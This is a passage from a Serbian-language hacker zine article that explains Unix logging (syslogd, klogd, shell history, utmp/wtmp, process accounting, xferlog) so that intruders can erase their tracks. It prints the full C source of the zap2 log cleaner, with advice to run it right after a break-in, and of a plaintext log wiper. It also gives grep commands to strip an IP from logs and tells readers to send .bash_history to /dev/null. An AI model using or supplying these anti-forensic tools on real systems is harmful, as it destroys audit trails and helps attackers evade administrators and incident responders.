iz kog skuplja informacije. Ukoliko nije mountovan taj fajlsistem poruke se citaju
iz sys_syslog.
Da napomenem samo da ukoliko su poruke nivoa 7 one se smatraju za 'debug' poruke.
Ukoliko zelimo da posle boota procitamo sve poruke i zapisemo u fajl koristicemo
sledecu komandu:

   ==---------[code]----------==
   klogd -o -f ./krnl.msg
   ==---------[/code]---------==

Kao sto je slucaj sa syslogd-om ovi mehanizmi za logovanje nemaju nikakav sistem
autorizacije tako da ukoliko dobijete root access niko vas nemoze spreciti da radite
sta logovima sta vam se prohte. To je jedna boljka ovih mehanizama.

Klogd odgovara na 8 signala:
  
  [=-  SIGHUP
  [=-  SIGINT
  [=-  SIGKILL
  [=-  SIGTERM
  [=-  SIGTSTP
  [=-  SIGUSR1
  [=-  SIGUSR2
  [=-  SIGCONT

SIGTSTP i SIGCONT signali sluze sa pokretanje odnosno zaustavljanje logovanja.
SIGINT,  SIGKILL, SIGTERM  i SIGHUP sluze za zatvaranje kernel log izvora.
KLOGD sve svoje informacije zapisuje u /var/log/messages fajl.




   ==-[ 0x02c %  syslogd


  Sistemsko logiranje se vrsi uz pomoc daemona pod nazivom syslogd.
Syslogd prima poruke od strane vise programa koji se nalaze na sistemu.
Takodje drugi uredjaji koji su povezani sa sistemom tipa ruteri i sl takodje
mogu slati log poruke na server.
Znaci zaklucili smo da syslogd sluzi za logovanje sistemskih poruka a klogd
za logovanje kernel poruka. syslogd cita log poruke u set fajlova koji su 
definisani konfig fajlom /etcsyslog.conf
Syslog je dosao sa BSD sistemima i zadrzao se i danas.
syslogd skuplja poruke sa unixovog domain socketa dev/log.un
kao i internet socketa u  /etc/services
imenovanog pajpa /dev/log
i kernel log device /dev/klog
programi pozivaju syslog() i salju log poruke domain socketu
ukoliko INET domain nije podesen nema poruka sa strane niti ka necemu reomote

svaka poruke je jedna linija 
Ukoliko budete prepravljali config fajl i zelite da restartujete syslogd to mozete
uraditi:

da ponovo procita config fajla



   ==---------[code]----------==
   kill -HUP `cat /var/run/syslog.pid` 
   ==---------[/code]---------==

Log fajl sledeci oblik:

   ==---------[code]----------==
   <datum/ vreme> <host> <source poruke> <poruka>
   ==---------[/code]---------==

Kratak primer:

   ==---------[code]----------==
   Nov 10 11:24:40 ns1 sshd[8414]: Accepted password for anton from 212.62.1.3 port 
   ==---------[/code]---------==

  [=- Timestamp  - sistemsko vreme i datum. Ukoliko se radi o lokalnom logovanu
                   to je vreme na masini koja pravi logove a kada se radi o remote
                   logovanju belezi se vreme masine koja prima logove.

  [=- Host/IP      - Moze biti domain name ili ime racunara ili ip.

  [=- Izvor poruke - source moze biti sys software .

  [=- Poruka       - string razlicitih formata

Vazno je znati da syslogd osluskuje na UDP portu 514 ocekujuci remote konekcije.
Admin da bi omogucio remote logging mora da edituje config fajl kako bi podesio da
syslogd osluskuje na vec pomenutom portu. Pokretanje uz podrsku remote logginga se
vrsi komandom:

   ==---------[code]----------==
   syslogd -r
   ==---------[/code]---------==

  Na Solarisu je npr ovo po defaultu vec.
Poruke stizu preko mreze u plain-text formatu i bez timestampa.
Pristigle poruke se salju na razlicite uredjaje fajlove itd.

Svaka syslog poruka bez obzira koji je program proizvede mora da se sastoji iz
odredjenih delova:

  [=- Vreme        -  Vreme kada je poruka generisana
  
  [=- Facility     -  Syslog facility

  [=- Priority     -  Syslog Priority

  [=- Ime          -  Ime programa koji je generisao poruku

  [=- PID          -  Process ID koji je generisao msg

  [=- Text         -  Tekst tj telo poruke


  Navescemo i tipove prioriteta syslog poruka:

  [=-  emerg       -  emergency , hitan dogadjaj npr pad sistema

  [=-  alert       -  situacija koja se mora odmah resavati

  [=-  crit        -  kriticn situacija

  [=-  err         -  obicna greska

  [=-  warning     -  upozorenje

  [=-  notice      -  nije greska ali treba pogledati

  [=-  info        -  informacije

  [=-  debug       -  poruke koje se koriste pri debugovanju programa


   ..[=-< Config file
   .
   .

  Veoma je vazno znati kako izgleda config fajl syslog-a jel kako biste inace znali
koje linije sta znace i sta trreba editovati. Stoga obratite paznju na ovaj deo jel ce
vam trebati. Njegovo razumevanje ce znaciti kompletno razumevanje mehanizma sysloga i
njegovo iskoriscavanje u vasu korist.

Primer dela syslog fajla:


   ==---------[code]----------==

   #  /etc/syslog.conf     Configuration file for syslogd.
   #
   #                       For more information see syslog.conf(5) 
   #                       manpage.

   #
   # First some standard logfiles.  Log by facility.
   #

   auth,authpriv.*                 /var/log/auth.log
   *.*;auth,authpriv.none          -/var/log/syslog
   #cron.*                         /var/log/cron.log
   daemon.*                        -/var/log/daemon.log
   kern.*                          -/var/log/kern.log
   lpr.*                           -/var/log/lpr.log
   mail.*                          -/var/log/mail.log
   user.*                          -/var/log/user.log
   uucp.*                          /var/log/uucp.log
   ==---------[/code]---------==

Svaka linija sadrzi dva dela:

  [=-  deo koji odredjuje koje se poruke salju tj loguju

  [=-  deo koji kaze sta raditi sa porukom tj kou akciju izvrsiti nad njom

Deo za poruke ima dva dela'

  [=-  Facility

  [=-  Priority

Ukoliko vidite mail.* znaci da se beleze sve poruke mail facility i svih prioriteta jel
se koristi wildcard *.
Drugi deo ima vise opcija tako da mozemo podatke slati :

  [=-  useru poruke se izbacuju na njegov terminal  kern.*    root,blood

  [=-  Svim userima ,  kern.*    *

  [=-  uredjaju      kern.*    /dev/console  (losa ideja zbog DoS)

  [=-  Drugom hostu  kern.*    @blood.com

  [=-  Fajlu   kern.*    /var/log/messages

Cilj vam je razumeti kako ovi mehanizmi rade i sta beleze onda sigurno mozete brisati
recorde koji se ticu vas i tako ostatiti nevidljivi u logovima. Takodje mozete nauciti
da fejkujete unose i zbunite admina.






   ==-[ 0x02d %  SHell logging


  TCSH shell ima svoj mehanizam preko kog mozete pratiti kada se neki user loguje
i odloguje sa sistema.On to radi preko varijable __WATCH__.
Ta varijabla sadrzi parove UID i brojeva terminala.Ovi parovi mogu sadrzati wildcards
ili rec __ANY__. Oni omogucavaju da se vrsi poklapanje preko bilo kog usera ili
terminala.Sintaksa komande je :

   ==---------[code]----------==
   set watch=(<user> <terminal>)
   ==---------[/code]---------==

Primer:

   ==---------[code]----------==
   set watch=(blood any)
   ==---------[/code]---------==

Ovde dajemo jasno do znanja da cekamo usera blooda da se loguje na bilo koji term-
inal. TCSH ce vas obavestiti kada se osoba pod tim ID loguje. Provere se vrse na
svakih 10 min po defaultu. Ukoliko zelimo da taj broj smanjimo tj da su provere 
cesce mozemo uraditi i to:

   ==---------[code]----------==
   set watch=(5 blood any)
   ==---------[/code]---------==

Pazite da ova komanda moze opteretiti sistem.

A sada jedna opste narodno poznate stvar fajl .bash_history   jeeeea!!!
Kao sto znate taj fajl belezi unete komande usera i nalazi se u njegovom home diru
kao sto vidite sa prefixom . sto znaci da je skriveni fajl. UVEK BRISITE OVAJ FAJL
tjl redirektujte ga u /dev/null. Ili najjednostavnije editujte ga onako kako vama
odgovara.Medjutim postoji jedna zackoljica kada uradite logout to ce se takodje zapisati
u fajl , resenje je /dev/null ili da se prebacite u drugi shell i tamo editujete fajl.


   ==---------[code]----------==
   ln -s /dev/null .bash_history
   ==---------[/code]---------==

  Inace shell moze da smesti do 500 komandi u history fajl.Medjutim ta broj se moze promeniti. To se moze isvesti menjanjem /etc/profile fajla i to vazi za sve usere:

HISTFILESIZE=20
HISTSIZE=20

To su varovi koji vam trebaju.

   ==---------[code]----------==
   vi /etc/skel/.bash_logout
   ==---------[/code]---------==

Pametan admin moze uraditi prethodno i dodati:

 rm -f  $HOME/.bash_history

Time ce admin postici da se history brise posle logouta usera.
Ukoliko zelite d vidite sadrzaj tog fajla isto mozete uraditi sa komandom history.

   ==---------[code]----------==
   #history
   489  ./log
   490  pico
   491  gcc -o da da.c
   492  rm da.c
   493  pico
   494  screen -R
   495  ps
   496  screen -R 23804.pts-2.c0re
   497  screen -R
   498  screen -R 23804.pts-2.c0re
   499  screen -R
   ==---------[/code]---------==






   ==-[ 0x02e %  Other logging

  Ako ste mislili da je to sve na sta treba da se obazirete i cega treba da se plasite
E PA NIJE!!! Ima toga jos:>
U ovom odeljku cemo navesti jos neke tipove logovanja i jos neke stvari na koje treba
da obratite paznju.


   ..[=-< Connect time accounting
   .
   .

  Mnogo sistemski programi zapisuju svoje podatke u dva fajla o kojima morate povesti
racuna, a to su:

  [=- $/wtmp
  [=- $/utmp

Znak $ sam stavio kao varijablu jel se ovi fajlovi na razlicitim sistemima nalaze
na razlicitim mestima :>

U UTMP fajl se upisuju podatci ko je trenutno logovan na sistem. Medjutim kada se 
korisnik odloguje sa sistema taj unos se brise.
WTMP fajl je drugaciji i na njega treba da obratite paznju jel on ne brise unos posle
logouta vec naprotiv dodaje jos jednu liniju - kada je user izvrsio logout.
U wtmp fajlu se nalazi jos par korisnih informacija kao sto je vreme gasenja,reboota 
sistema ili promena sistemskog vremena.
Belezi se cak i terminal na koji je user logovan,ime korisnika,ima remote hosta 
ukoliko je logovanje remote, vreme koje je user proveo na terminalu. Kao sto vidite
ovaj fajl je pravi zlatni rudnik informacija.



   ..[=-< Process Accounting
   .
   .

  
  Pored logovanja i odlogovanja UNIX sistemi mogu beleziti i svaku pokrenutu komandu.
Te komande se beleze za svakog usera.
Specijalna vrsta logovanja koja se bavi ovom materijom naziva se process accounting/

   ==---------[code]----------==
   % lastcomm
   who    F    root     _  _              0.05 secs Sat Mar 03 15:22
   mail       S     daemon   _  _         0.34 secs Sat Mar 13 13:00
   send             dfr      _  _         0.05 secs Sat Mar 15 11:01
   ==---------[/code]---------==


Ovi podatci se nalaze u /var/adm/acct fajlu. A komanda lastcomm cita unose iz ovog fajla
Naravno da vi mozete prepraviti ovaj fajl sto se naravno smatra obaezno :>
Prednost vam daje i to sto se ovde ne beleze uneti argumenti niti dir gde je komanda
ukucana sto je dobro za vas.

Na nekim OS zasnovanim na unixu process acc mozes ukljuciti sa:

   ==---------[code]----------==
   # accton ime_fajla
   ==---------[/code]---------==

  Gde je ime fajla mesto gde se cuvaji informacije o logovanju npr /var/log/acct.
Takodje novji kerneli su sposobni da drze vise informacija o proc acc tip CPU time i sl.
Softver za proc acc mozete skinuti npr sa adrese http://sunsite.unc.edu/pub/Linux/system/admin/quota-acct-modified.tgz
i instalirati ga na klasican nacin.
Zatim cemo modifikovati sys init skript 
kako bi uklucio proc acc za vreme boota:

   ==---------[code]----------==
# ukljucen proc acc
if [ -x /sbin/accton ]
then 
/sbin/accton /var/log/pacct 
echo "Process accounting ukljucen" 
fi
   ==---------[/code]---------==

zatim cemo napraviti fajla pacct:

   ==---------[code]----------==
   touch /var/log/pacct
   ==---------[/code]---------==

Namestiti permisije da samo root moze da cita i pise a ostali citaju.

   ==---------[code]----------==
   chown root /var/log/pacct
   chmod 0644 /var/log/pacct
   ==---------[/code]---------==


reboot. :>

Tako cete nauciti kako taj sistem radi ukoliko na nekoj maini naletite na nesto
slicno.

//////////////////////////////////////////////////////////////////////////////// 
--==<[ 0x03 %  WIPEOUT!!!
\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\  




   ==-[ 0x03a %  UTMP

  O samom nacinu rada UTMP tj o njegovoj ulozi sam vec pricao pa se necu ponavljati.
XAXAXAxa joj umrecu sad dosao neki lik xaxa kako sere gladan non stop.Dosao kod mene na 
posao pokazem mu program Route a on axa to je onaj protiv spama ....lol a to je kao
najveci mozak od matoraca za IT...evo vam ciko drajveri za XP nene sinko to su za intela...ma ne ovo su vam za OS winxp ...ne to je za intel valjda znam...lol omg
jao bezi....
elem...pogledajmo sada ovo:


   ==---------[code]----------==
   bloodzero@c0re:~$ w
   13:04:52 up 11 days, 17:07,  2 users,  load average: 0.00, 0.00, 0.00
   USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
   bloodzer pts/0    sa1-070.ptt.yu   12:35   26:59   0.00s  0.00s -bash
   bloodzer pts/10   sa1-070.ptt.yu   12:49    0.00s  0.00s  0.00s w
   ==---------[/code]---------==

   ==---------[code]----------==
   bloodzero@c0re:~$ who
   bloodzer pts/0        Jul 28 12:35 (sa1-070.ptt.yu)
   bloodzer pts/10       Jul 28 12:49 (sa1-070.ptt.yu)
   ==---------[/code]---------==

Mi koristimo ovakve komande kako bi ekstraktovali izlaz UTMP fajla.
Sto znaci da UTMP fajl nije plain-text fajl vec je binarni , sto opet
znaci da ga nemozete editovati nekim tekst editorom, sto opet znaci da ste ugasili :>
Dobro ne znaci to zadnje.

  Za brisanje ovakvih logova mozete korisiti razne alate za tu svrhu.
Jedan od najboljih je i *CLEAR* , a zatim i *WIPE*
WIPE mozete skinuti sa http://www.thehackerschoice.com/releases/thc-uht1.tgz.

Ovde mozemo koristiti mozda i najpopularniji program za brisanje logova zap2.
Najbolje da zap2 pokrenete odmah posle provale i dobijanja pristupa.
Source z2:


   ==---------[code]----------==
#include <sys/types.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/file.h>
#include <fcntl.h>
#include <utmp.h>
#include <pwd.h>
#include <lastlog.h>
#define WTMP_NAME "/usr/adm/wtmp"
#define UTMP_NAME "/etc/utmp"
#define LASTLOG_NAME "/usr/adm/lastlog"
 
int f;
 
void kill_utmp(who)
char *who;
{
    struct utmp utmp_ent;
 
  if ((f=open(UTMP_NAME,O_RDWR))>=0) {
     while(read (f, &utmp_ent, sizeof (utmp_ent))> 0 )
       if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
                 bzero((char *)&utmp_ent,sizeof( utmp_ent ));
                 lseek (f, -(sizeof (utmp_ent)), SEEK_CUR);
                 write (f, &utmp_ent, sizeof (utmp_ent));
            }
     close(f);
  }
}
 
void kill_wtmp(who)
char *who;
{
    struct utmp utmp_ent;
    long pos;
 
    pos = 1L;
    if ((f=open(WTMP_NAME,O_RDWR))>=0) {
 
     while(pos != -1L) {
        lseek(f,-(long)( (sizeof(struct utmp)) * pos),L_XTND);
        if (read (f, &utmp_ent, sizeof (struct utmp))<0) {
          pos = -1L;
        } else {
          if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
               bzero((char *)&utmp_ent,sizeof(struct utmp ));
               lseek(f,-( (sizeof(struct utmp)) * pos),L_XTND);
               write (f, &utmp_ent, sizeof (utmp_ent));
               pos = -1L;
          } else pos += 1L;
        }
     }
     close(f);
  }
}
 
void kill_lastlog(who)
char *who;
{
    struct passwd *pwd;
    struct lastlog newll;
 
     if ((pwd=getpwnam(who))!=NULL) {
 
        if ((f=open(LASTLOG_NAME, O_RDWR)) >= 0) {
            lseek(f, (long)pwd->pw_uid * sizeof (struct lastlog), 0);
            bzero((char *)&newll,sizeof( newll ));
            write(f, (char *)&newll, sizeof( newll ));
            close(f);
        }
 
    } else printf("%s: ?\n",who);
}
 
main(argc,argv)
int argc;
char *argv[];
{
    if (argc==2) {
        kill_lastlog(argv[1]);
        kill_wtmp(argv[1]);
        kill_utmp(argv[1]);
        printf("Zap2!\n");
    } else
    printf("Error.\n");
}
   ==---------[/code]---------==

U delu koda - 

#define WTMP_NAME "/usr/adm/wtmp"
#define UTMP_NAME "/etc/utmp"
#define LASTLOG_NAME "/usr/adm/lastlog"

izmenite fajlove onako kako je na ciljanom sistemu tj kakav je raspored.




   ==-[ 0x03b %  WTMP

  
   Ovaj fajl je slican UTMP kao sto vec rekoh stim sto je razlika da on belezi i logoute
kao i reboote i gasenja (~~ i ~)
Komanda last koristi ovaj binarni fajl kako bi dala izlaz na kom cete videti :


   ==---------[code]----------==
   #last

   boyscout pts/2        cmung3109.cmu.ca Fri Jul  1 12:16 - 12:51  (00:35)
   boyscout pts/2        cmung3109.cmu.ca Fri Jul  1 12:05 - 12:05  (00:00)
   hazard   pts/2        cmung3222.cmu.ca Fri Jul  1 11:35 - 12:03  (00:28)
   bloodzer pts/6        sa1-119.ptt.yu   Fri Jul  1 10:48 - 15:59  (05:11)
   hazard   pts/2        cmung2597.cmu.ca Fri Jul  1 10:26 - 10:56  (00:30)
   nimr0d   pts/0        83-131-69-149.ad Fri Jul  1 07:01 - 16:34  (09:33)

   wtmp begins Fri Jul  1 07:01:19 2005

   ==---------[/code]---------==

  Ovo je samo MALI MALI isecak iz izlaza jel je on ogroman. Kao sto vidite mozete
uociti username logovanog korisnika host odakle se logovo datum i vreme kao i
vreme provedeno za terminalom.

Komandom lastlog mozete videti kada se zadnji put user logovao i da li se ikada
logovao:

   ==---------[code]----------==
   bloodzero@c0re:~$ lastlog
   Username         Port     From             Latest
   root             pts/7    cmung2619.cmu.ca Tue Jun 21 02:52:20 -0400 2005
   daemon                                     **Never logged in**
   bin                                        **Never logged in**
   sys                                        **Never logged in**
   sync                                       **Never logged in**
   games                                      **Never logged in**
   man                                        **Never logged in**

   ==---------[/code]---------==


  Programom koji cu paste-tati mozete lako obrisati tj modifikovati ove
log fajlove.

   ==---------[code]----------==
/*
 * Plaintext Log Wipe v1
 * 02-08-2002 XT [DuHo] [MM-DD-YYYY]
 *
 * Removes lines containing <pattern> from <logfile>.
 * Useful for removing IP-addresses from logfiles for example
 *
 * Usage:
 * gcc -o pwipe pwipe.c
 * ./pwipe <pattern> <logfile>
 *
 * ex.
 * # ./pwipe '192.168.1.231' /usr/adm/messages
 *
 * I, nor DUHO is responsible for any damage you might bring to a system
 * using this tool!
 *
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main (int argc, char *argv[])
{
   FILE *fp;
   long fsize;
   long i;
   char *src;
   char *dest;
   char version[] = "Plaintext Log Wiper v1.0 by XT [DuHo]";

   printf("%s\n\n", version);

   if (argc<3)
    {
      printf("Syntax: %s <pattern> <logfile>\n", argv[0]);
      exit(0);
    }

   // open file read-only
   if ((fp = fopen(argv[2], "r"))==NULL)
    {
      fprintf(stderr, "Unable to open %s\n", argv[2]);
      exit(1);
    }

   // Is there any more direct way to determine filesize?
   fseek(fp, 0L, SEEK_END);
    if ((fsize = ftell(fp))<1)
     {
       fprintf(stderr, "%s is empty or an error occurred\n", argv[2]);
       exit(1);
     } else
          rewind(fp);

    // allocate enough memory
    src = (char *) malloc((size_t)fsize);
    dest = (char *) malloc((size_t)fsize);

   // select lines to remove
   for (i=0;(fgets(src, fsize, fp))!=NULL;)
    {
       if ((strstr(src, argv[1]))==NULL)
        {
          strncat(dest, src, (size_t)fsize);
        } else
           {
             printf("Selected: %s", src);
             ++i;
           }
    }

   // reopen file write-only
   if ((fp = freopen(argv[2], "w", fp))==NULL)
    {
      fprintf(stderr, "\nUnable to open file %s for writing\n", argv[2]);
      exit(1);
    }

   // write new logfile to disk
   if (fputs(dest, fp)<0)
    {
      fprintf(stderr, "\nUnable to overwrite file %s\n", argv[2]);
      exit(1);
    } else if (i>0)
         printf("\nSuccesfully removed %d %s!\n", i, i==1 ? "log-entry" : "log-entries");
      else
         printf("\"%s\" not found in %s\n", argv[1], argv[2]);

   fclose(fp);
   exit(0);
}  

   ==---------[/code]---------==


   ==---------[code]----------==
   bloodzero@c0re:~$ gcc -o da da.c

   bloodzero@c0re:~$ ./da
   Plaintext Log Wiper v1.0 by XT [DuHo]

   Syntax: ./da <pattern> <logfile>
   ==---------[/code]---------==


   ==-[ 0x03c %  CLEAR!!!

  Plain-text logove mozete brisati i rucno bez ikakvih pomocnih sredstava. Evo efikasan skript kojim cete izbrisati vasu ip iz logova gde god se ista pojavljuje:



   ==---------[code]----------==
   # grep -v <pattern> <logfile> > /tmp/a ; mv /tmp/a <logfile> ; rm -f /tmp/a
   ==---------[/code]---------==

U stvari sve sto vam je potrebno to je tekst editor i nista vise.


   ==---------[code]----------==
   cat /var/log/messages > /dev/null
   ==---------[/code]---------==

Na ovaj nacin cete izbrisati fajl tj isprazniti ga mada ce fajl fizicki i dalje
da postoji. Medjutim ovo ce izazvati sumnju kod admina tako da se ovaj nacin ne preporucuje.

   ==-[ 0x03d %  xFERlog


  Ukoliko koristite ftp za prenos fajlova i sl ostavicete tragove u ovom logu , sto ukratko
znaci da ste ga najebali ukoliko ga ne ocistite kako treba.
Naime on je plain-text pa ga mozete editovati sa bilo kojim tekst editorom i izbrisati
linije koje zelite, ukloniti transfere itd.Ciscenje radi posle svakog obrisanog fajla.
Sledeci podatci se mogu naci za svaki preneseni fajl u xferlogu:

   [=-  Datum i Vreme prenosa

   [=-  Ime remote hosta 

   [=-  Velicina fajla

   [=-  Ime fajla

   [=-  Mod prenosa a - ASCII  b - binary

   [=-  Special action flag  c - compresovan  u - unkompresovan t - arhiva

   [=-  Smer prenosa  o - outgoing  i - incoming

   [=-  Tip usera  a = anonimni  g - gost  c - local user

Potrudite se da obrisete sve sto vas moze kompromitovati svaka linija koja se tice vas
i vaseg rada na tom boxu.
Rotiranje logova na FTP serverima se odvija prema config fajlovima :


   ==---------[code]----------==
bloodzero@zion:~$ cat /etc/logrotate.d/wu-ftpd
/var/log/wu-ftpd/xferreport {
  rotate 15
  monthly
  missingok
}

/var/log/wu-ftpd/xferlog {
  rotate 10
  monthly
  compress
  copytruncate
  missingok
  start 1
  postrotate
    /usr/sbin/xferstats -f /var/log/wu-ftpd/xferlog.1 -a -d -h 2>&1 >/var/log/wu-ftpd/xferreport
#   killall -HUP inetd
  endscript
}

   ==---------[/code]---------==

U diru /etc/logrotate.d nalazi ce se config fajlovima od FTP servera koji je instaliran na
boxu.


   ==-[ 0x03e %  SUlog

  Kao sto znate komanda SU sluzi kako biste na neko vreme postalo superuser. Sve sto treba
da znateje sifra superusera tj roota.
Ovakva vrsta logovanja belezi sve pokusaje koriscenja su komande. Mnogi useri mogu da pokusaju da postanu ROOT a da nemaju to pravo . Zbog toga admini cesto koriste podatke
iz ovog fajla. Nedozvoljeni pokusaji SU ce brzo upasti u oko adminu tako da vrsite SU
samo ukoliko imate pass za koji ste sigurni da radi.
Adminu ce odmah u oci upasti ona ko pokusava vise puta da se loguje kao root.



...i to je to vise nemogu ni da me puskom terate idem se napijem veceras u pariz  :>>>>
happy hacking


----------------------<EOF>


bloodzero@c0re:~$ wc zine3
lines-1758  
words-7637 
latters-54662 
zine3




logout;



